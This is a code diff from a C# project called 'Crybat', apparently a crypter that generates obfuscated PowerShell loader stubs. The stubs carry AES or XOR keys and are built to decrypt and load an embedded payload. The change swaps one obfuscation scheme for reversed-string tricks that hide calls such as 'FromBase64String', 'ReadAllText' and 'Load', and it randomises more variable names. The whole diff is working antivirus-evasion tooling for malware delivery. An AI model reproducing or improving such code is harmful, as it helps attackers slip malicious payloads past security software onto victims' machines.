@@ -13,31 +13,13 @@ namespace Crybat
             string frombase64string_var = RandomString(5, rng);
             string readalltext_var = RandomString(5, rng);
 
-            Dictionary<string, string> frombase64string = new Dictionary<string, string>() { 
-                { "$" + RandomString(4, rng), "Fro" }, 
-                { "$" + RandomString(4, rng), "mBase" },
-                {"$" + RandomString(4, rng), "64St" },
-                { "$" + RandomString(4, rng), "ring" },
-            };
-            Dictionary<string, string> readalltext = new Dictionary<string, string>() {
-                { "$" + RandomString(4, rng), "Rea" },
-                { "$" + RandomString(4, rng), "dAl" },
-                {"$" + RandomString(4, rng), "lTe" },
-                { "$" + RandomString(4, rng), "xt" },
-            };
-
-            StringBuilder obf = new StringBuilder();
-            foreach (var item in frombase64string) { obf.AppendLine(item.Key + "='" + item.Value + "';"); }
-            obf.AppendLine("$" + frombase64string_var + "=" + string.Join("+", frombase64string.Keys) + ";");
-            foreach (var item in readalltext) { obf.AppendLine(item.Key + "='" + item.Value + "';"); }
-            obf.AppendLine("$" + readalltext_var + "=" + string.Join("+", readalltext.Keys) + ";");
-
-            string stubcode = obf.ToString();
+            string stubcode = string.Empty;
             if (mode == EncryptionMode.AES)
             {
                 stubcode += GetEmbeddedString("Crybat.Resources.AESStub.ps1");
-                stubcode = stubcode.Replace("FromBase64String", "$" + frombase64string_var);
-                stubcode = stubcode.Replace("ReadAllText", "$" + readalltext_var);
+                stubcode = stubcode.Replace("FromBase64String", "('gnirtS46esaBmorF'[-1..-16] -join '')");
+                stubcode = stubcode.Replace("ReadAllText", "('txeTllAdaeR'[-1..-11] -join '')");
+                stubcode = stubcode.Replace("Load", "('daoL'[-1..-4] -join '')");
                 stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
                 stubcode = stubcode.Replace("DECRYPTION_IV", Convert.ToBase64String(iv));
                 stubcode = stubcode.Replace("contents_var", RandomString(5, rng));
@@ -49,12 +31,15 @@ namespace Crybat
                 stubcode = stubcode.Replace("msi_var", RandomString(5, rng));
                 stubcode = stubcode.Replace("mso_var", RandomString(5, rng));
                 stubcode = stubcode.Replace("gs_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("obfstep1_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("obfstep2_var", RandomString(5, rng));
             }
             else
             {
                 stubcode += GetEmbeddedString("Crybat.Resources.XORStub.ps1");
-                stubcode = stubcode.Replace("FromBase64String", "$" + frombase64string_var);
-                stubcode = stubcode.Replace("ReadAllText", "$" + readalltext_var);
+                stubcode = stubcode.Replace("FromBase64String", "('gnirtS46esaBmorF'[-1..-16] -join '')");
+                stubcode = stubcode.Replace("ReadAllText", "('txeTllAdaeR'[-1..-11] -join '')");
+                stubcode = stubcode.Replace("Load", "('daoL'[-1..-4] -join '')");
                 stubcode = stubcode.Replace("DECRYPTION_KEY", Convert.ToBase64String(key));
                 stubcode = stubcode.Replace("contents_var", RandomString(5, rng));
                 stubcode = stubcode.Replace("lastline_var", RandomString(5, rng));
@@ -64,6 +49,8 @@ namespace Crybat
                 stubcode = stubcode.Replace("msi_var", RandomString(5, rng));
                 stubcode = stubcode.Replace("mso_var", RandomString(5, rng));
                 stubcode = stubcode.Replace("gs_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("obfstep1_var", RandomString(5, rng));
+                stubcode = stubcode.Replace("obfstep2_var", RandomString(5, rng));
             }
             stubcode = stubcode.Replace(Environment.NewLine, string.Empty);
             return stubcode;
